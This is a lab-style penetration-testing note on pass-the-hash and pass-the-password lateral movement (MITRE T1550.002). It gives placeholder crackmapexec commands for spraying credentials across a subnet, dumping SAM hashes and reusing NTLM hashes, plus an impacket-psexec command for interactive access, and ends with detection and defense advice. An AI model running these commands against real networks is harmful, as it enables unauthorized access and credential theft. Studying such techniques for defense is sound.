# Pass-the-Hash / Pass-the-Password

**MITRE ATT&CK:** T1550.002 — Use Alternate Authentication Material: Pass the Hash

## Overview

Once a valid credential (password or NTLM hash) is obtained, it can be
sprayed across the environment to find where else it's valid — either
because of password reuse or because the same local-admin credential is
shared across hosts (a very common misconfiguration when machines are
imaged from the same template).

## Steps

### 1. Credential spray across the subnet

```bash
crackmapexec smb <SUBNET>/24 -u <LOWPRIV_USER> -d <DOMAIN> -p '<LOWPRIV_PASS>'
```

### 2. Where valid, dump local SAM hashes

```bash
crackmapexec smb <SUBNET>/24 -u <LOWPRIV_USER> -d <DOMAIN> -p '<LOWPRIV_PASS>' --sam
```

Hosts where the account is **local admin** are flagged `(Pwn3d!)`, and CME
will dump the local SAM database, e.g.:

```
<LOCAL_USER>:1002:aad3b435b51404eeaad3b435b51404ee:<NT_HASH>:::
```

### 3. Interactive access on a Pwn3d host

```bash
sudo impacket-psexec <DOMAIN>/<LOWPRIV_USER>:'<LOWPRIV_PASS>'@<TARGET_IP>
```

### 4. Reuse a dumped local NTLM hash elsewhere (pass-the-hash proper)

Local accounts are frequently reused with the same password (and therefore
the same NTLM hash) across every machine imaged from one template — this is
what makes step 2's dump valuable beyond the single host it came from:

```bash
crackmapexec smb <SUBNET>/24 -u <LOCAL_USER> -H 'aad3b435b51404eeaad3b435b51404ee:<NT_HASH>' --local-auth
```

No cracking needed — the raw NTLM hash is directly usable as the
authentication material.

## Key Notes

- Pass-the-hash works because NTLM authentication only ever needs the hash,
  never the plaintext — this is a design property of the protocol, not a
  bug in any one tool.
- `--local-auth` is required when authenticating as a **local** account
  rather than a domain account — CME needs to know not to check the account
  against the DC.
- A single reused local-admin credential across a fleet of workstations
  turns one compromised host into a fleet-wide compromise instantly.

## Detection & Defenses

- **Enable Windows Defender Credential Guard** and **LSA Protection** to
  raise the cost of hash extraction in the first place.
- **Randomize local admin passwords per-host** with LAPS (Local
  Administrator Password Solution) — this alone kills the "one hash, every
  host" failure mode.
- Restrict NTLM where possible (`Network security: Restrict NTLM` GPOs),
  favoring Kerberos.
- Monitor Event ID 4624 Logon Type 3 with NTLM auth from a single source to
  many destinations in a short window — a classic spray/PtH signature.

---

*Performed against an isolated, self-owned lab domain for training purposes only.*
